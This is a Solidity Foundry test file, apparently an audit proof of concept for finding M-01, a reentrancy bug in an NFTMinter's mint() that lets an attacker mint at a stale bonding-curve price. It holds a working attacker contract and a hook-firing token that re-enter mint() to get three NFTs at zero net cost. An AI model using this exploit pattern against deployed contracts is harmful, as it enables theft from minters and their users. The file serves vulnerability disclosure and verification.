// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {NFTMinter} from "../src/NFTMinter.sol";
import {Gather} from "../src/dispatchers/Gather.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

/**
 * @title M-01 PoC: Cross-contract reentrancy in NFTMinter.mint() -- price updated after external calls
 * @notice Demonstrates that an attacker can mint multiple NFTs at a stale price by exploiting
 *         the CEI violation in mint().
 *
 * @dev Vulnerability Location: NFTMinter.sol#L119-L147
 *
 * VULNERABILITY SUMMARY:
 * In mint(), the execution order is:
 *   1. Read price (L128)
 *   2. transferFrom user -> minter (L132)
 *   3. dispatch() -- external call to dispatcher (L136)
 *   4. Update price (L139) -- STATE UPDATE AFTER EXTERNAL CALL
 *   5. _mint() ERC1155 (L142)
 *
 * The price state update at L139 occurs AFTER the external dispatch() call at L136.
 * If dispatch() triggers a callback (e.g., via ERC777-style token hooks or a Gather
 * dispatcher forwarding to a malicious recipient), the attacker can re-enter mint()
 * and mint at the old, un-incremented price.
 *
 * ATTACK PATH:
 * 1. Owner registers a Gather dispatcher with a HookToken (ERC777-like) as the prime token.
 *    The Gather recipient is set to the attacker contract.
 * 2. Attacker calls mint(). Inside dispatch(), Gather transfers tokens to the attacker contract.
 *    The HookToken's transfer() triggers a callback on the attacker.
 * 3. The attacker's callback re-enters NFTMinter.mint() at the STALE price (price hasn't
 *    been updated yet because we're still inside dispatch()).
 * 4. The second mint completes at the old price. Then the first mint resumes and updates price.
 *    Result: attacker minted 2 NFTs but both at the original price, saving the growth increment.
 *
 * IMPACT:
 * With sufficient reentrancy depth, an attacker can mint N NFTs all at the initial price,
 * bypassing the bonding-curve price growth entirely. The economic loss scales with
 * growthBasisPoints and the number of reentrant mints.
 */

// =============================================================================
// Mock ERC20 with ERC777-style transfer hooks
// =============================================================================

/// @notice ERC20 token that calls a hook on the recipient during transfer().
/// @dev Simulates ERC777 tokensReceived() behavior. This is realistic because
///      ERC777 tokens are ERC20-compatible and widely deployed (e.g., on mainnet).
contract HookToken is ERC20 {
    constructor() ERC20("HookToken", "HOOK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @notice Override transfer to call a hook on the recipient BEFORE returning.
    /// @dev This mimics ERC777's tokensReceived() callback.
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Perform the actual transfer first
        bool result = super.transfer(to, amount);

        // Then trigger the hook on the recipient (ERC777-style callback)
        // This is the reentrancy vector: code in the recipient executes while
        // the caller (Gather.dispatch) has not yet returned to NFTMinter.mint()
        if (_isContract(to)) {
            ITokenReceiveHook(to).onTokenReceived(msg.sender, amount);
        }

        return result;
    }

    function _isContract(address addr) internal view returns (bool) {
        return addr.code.length > 0;
    }
}

/// @notice Interface for the token receive hook callback.
interface ITokenReceiveHook {
    function onTokenReceived(address from, uint256 amount) external;
}

// =============================================================================
// Attacker Contract
// =============================================================================

/// @notice Malicious contract that re-enters NFTMinter.mint() when it receives
///         tokens from the Gather dispatcher during dispatch().
contract ReentrantAttacker is IERC1155Receiver, ITokenReceiveHook {
    NFTMinter public minter;
    HookToken public token;
    uint256 public dispatcherIndex;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;

    /// @notice Tracks the price observed at each mint call
    uint256[] public pricesObserved;

    constructor(
        NFTMinter _minter,
        HookToken _token,
        uint256 _dispatcherIndex,
        uint256 _maxReentrancy
    ) {
        minter = _minter;
        token = _token;
        dispatcherIndex = _dispatcherIndex;
        maxReentrancy = _maxReentrancy;
    }

    /// @notice Initiate the attack: call mint() which will trigger reentrancy via dispatch
    function attack() external {
        // Record the price before the first mint
        uint256 currentPrice = minter.getPrice(dispatcherIndex);
        pricesObserved.push(currentPrice);

        // Approve minter to pull tokens
        token.approve(address(minter), type(uint256).max);

        // First mint call -- this triggers the chain:
        // mint() -> dispatch() -> Gather.transfer() -> HookToken.transfer() -> onTokenReceived() -> re-enter mint()
        minter.mint(address(token), dispatcherIndex, address(this));
    }

    /// @notice Called by HookToken when this contract receives tokens from Gather.
    /// @dev This is the reentrancy callback. We are inside dispatch() at this point,
    ///      so config.price has NOT been updated yet.
    function onTokenReceived(address, uint256) external override {
        reentrancyCount++;

        if (reentrancyCount < maxReentrancy) {
            // Record the stale price (should be the same as initial -- that's the bug)
            uint256 stalePrice = minter.getPrice(dispatcherIndex);
            pricesObserved.push(stalePrice);

            // Re-enter mint() at the stale price
            minter.mint(address(token), dispatcherIndex, address(this));
        }
    }

    /// @notice Returns all prices observed during the attack
    function getPricesObserved() external view returns (uint256[] memory) {
        return pricesObserved;
    }

    // --- ERC1155 Receiver (required for _mint callback) ---

    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}

// =============================================================================
// PoC Test
// =============================================================================

contract M01PoCTest is Test {
    NFTMinter public minter;
    HookToken public token;
    Gather public gather;
    ReentrantAttacker public attacker;

    address public owner = address(this);

    uint256 constant INITIAL_PRICE = 100e18;
    uint256 constant GROWTH_BPS = 1000; // 10% growth per mint
    uint256 constant REENTRANT_MINTS = 3; // Total mints via reentrancy

    function setUp() public {
        // 1. Deploy NFTMinter
        minter = new NFTMinter(owner);

        // 2. Deploy HookToken (ERC777-like ERC20)
        token = new HookToken();

        // 3. Deploy attacker contract (will be the Gather recipient)
        //    We need to deploy attacker before Gather so we can set attacker as recipient.
        //    But attacker needs the dispatcher index. We know it will be index 1.
        //    Deploy a placeholder attacker first, then set up Gather.

        // 4. Deploy Gather dispatcher with the attacker as the recipient.
        //    This is the key: when Gather.dispatch() transfers tokens to the recipient,
        //    the HookToken triggers onTokenReceived() on the attacker contract.
        //    NOTE: In a real scenario, the Gather recipient could be set to any address
        //    by the owner. The attacker could be a seemingly benign multisig or contract
        //    that later deploys malicious logic.

        // We use a temporary address for gather recipient, then deploy attacker
        // Actually, deploy gather with a placeholder, then deploy attacker, then update recipient
        gather = new Gather(address(token), address(1), "Gather HOOK", owner);
        gather.setMinter(address(minter));

        // 5. Register the dispatcher in NFTMinter (index = 1)
        minter.registerDispatcher(address(gather), INITIAL_PRICE, GROWTH_BPS);

        // 6. Deploy attacker contract targeting index 1
        attacker = new ReentrantAttacker(minter, token, 1, REENTRANT_MINTS);

        // 7. Update Gather recipient to the attacker contract
        gather.setRecipient(address(attacker));

        // 8. Fund the attacker with enough tokens for the first mint.
        //    Because the Gather recipient IS the attacker, tokens flow in a circle:
        //      attacker -> minter -> gather -> attacker
        //    So the attacker only needs enough for ONE mint price. The tokens come
        //    back via the Gather transfer, enabling unlimited reentrant mints.
        token.mint(address(attacker), INITIAL_PRICE);
    }

    /// @notice Demonstrates that reentrancy allows minting at stale prices.
    function test_poc_M01_reentrancy_stale_price() public {
        console.log("=== M-01 PoC: Cross-contract reentrancy in NFTMinter.mint() ===");
        console.log("");

        // --- Step 1: Record initial state ---
        uint256 priceBefore = minter.getPrice(1);
        uint256 attackerTokensBefore = token.balanceOf(address(attacker));
        uint256 attackerNFTsBefore = minter.balanceOf(address(attacker), minter.CLAIM_TOKEN_ID());

        console.log("Step 1: Initial state");
        console.log("  Initial price:      ", priceBefore);
        console.log("  Attacker tokens:    ", attackerTokensBefore);
        console.log("  Attacker NFTs:      ", attackerNFTsBefore);
        console.log("");

        // --- Step 2: Execute the reentrancy attack ---
        console.log("Step 2: Attacker calls attack() -- triggers reentrancy via dispatch()");
        console.log("  Flow: mint() -> dispatch() -> Gather.transfer() -> HookToken callback -> re-enter mint()");
        console.log("");

        attacker.attack();

        // --- Step 3: Verify the results ---
        uint256 priceAfter = minter.getPrice(1);
        uint256 attackerTokensAfter = token.balanceOf(address(attacker));
        uint256 attackerNFTsAfter = minter.balanceOf(address(attacker), minter.CLAIM_TOKEN_ID());

        console.log("Step 3: Post-attack state");
        console.log("  Final price:        ", priceAfter);
        console.log("  Attacker tokens:    ", attackerTokensAfter);
        console.log("  Attacker NFTs:      ", attackerNFTsAfter);
        console.log("");

        // --- Verify all 3 NFTs were minted ---
        assertEq(
            attackerNFTsAfter,
            REENTRANT_MINTS,
            "Attacker should have minted 3 NFTs via reentrancy"
        );

        // --- Verify all mints happened at the SAME stale price ---
        uint256[] memory prices = attacker.getPricesObserved();
        console.log("Step 4: Prices observed during each mint:");
        for (uint256 i = 0; i < prices.length; i++) {
            console.log("  Mint", i + 1, "price:", prices[i]);
        }
        console.log("");

        // All observed prices should be the initial price (no growth applied during reentrancy)
        for (uint256 i = 0; i < prices.length; i++) {
            assertEq(
                prices[i],
                INITIAL_PRICE,
                "All reentrant mints should observe the same stale price"
            );
        }

        // --- Verify attacker got tokens back (circular flow) ---
        // Because attacker IS the Gather recipient, tokens flow in a circle:
        //   attacker -> minter (transferFrom) -> gather (dispatch) -> attacker (transfer)
        // The attacker ends up with the SAME token balance they started with!
        console.log("Step 5: Token flow analysis (circular -- attacker loses nothing)");
        console.log("  Attacker tokens before:", attackerTokensBefore);
        console.log("  Attacker tokens after: ", attackerTokensAfter);
        uint256 actualTokensSpent = attackerTokensBefore - attackerTokensAfter;
        console.log("  Net tokens spent:      ", actualTokensSpent);
        console.log("");

        assertEq(
            attackerTokensAfter,
            attackerTokensBefore,
            "Attacker should have all tokens back (circular flow via Gather)"
        );

        // --- Calculate economic impact ---
        // Without reentrancy, 3 sequential mints would cost:
        //   Mint 1: 100e18
        //   Mint 2: 100e18 + 10% = 110e18
        //   Mint 3: 110e18 + 10% = 121e18
        //   Total: 331e18
        uint256 price1 = INITIAL_PRICE;
        uint256 price2 = price1 + (price1 * GROWTH_BPS) / 10000;
        uint256 price3 = price2 + (price2 * GROWTH_BPS) / 10000;
        uint256 honestCost = price1 + price2 + price3;

        console.log("Step 6: Economic impact");
        console.log("  Honest cost for 3 mints:", honestCost);
        console.log("  Attacker net cost:       0 (tokens returned via Gather)");
        console.log("  Attacker savings:        ", honestCost);
        console.log("");

        // --- Verify the price only increased once instead of three times ---
        // Due to the CEI violation, all 3 mint() calls read the same stale price.
        // Each call writes: config.price = stalePrice + stalePrice * 10% = 110e18
        // The writes OVERWRITE each other. So the final price is 110e18 (only 1 growth)
        // instead of the expected 133.1e18 (3 growths: 100 -> 110 -> 121 -> 133.1).
        uint256 expectedPriceAfterHonest3Mints = price3 + (price3 * GROWTH_BPS) / 10000;

        console.log("Step 7: Price corruption proof");
        console.log("  Expected price after 3 honest mints:", expectedPriceAfterHonest3Mints);
        console.log("  Actual price after reentrancy attack:", priceAfter);
        console.log("");

        // All 3 calls compute: 100 + 100*10% = 110. The last write wins -> 110e18.
        // If mints were sequential, price would be 133.1e18 after 3 mints.
        assertEq(
            priceAfter,
            INITIAL_PRICE + (INITIAL_PRICE * GROWTH_BPS) / 10000,
            "Price should only reflect 1 growth (stale reads overwrote each other)"
        );
        assertTrue(
            priceAfter < expectedPriceAfterHonest3Mints,
            "Final price is lower than it would be with honest sequential mints"
        );

        console.log("Step 8: Root cause confirmation");
        console.log("  CEI violation: dispatch() at L136 executes BEFORE price update at L139");
        console.log("  No reentrancy guard on mint()");
        console.log("  All 3 mints read the same stale price of", INITIAL_PRICE);
        console.log("  Price updates all wrote the same value, so only 1 growth applied");
        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("  Reentrancy via dispatch() + CEI violation = stale price exploitation");
        console.log("  3 NFTs minted, 0 net cost, price curve bypassed");
    }
}
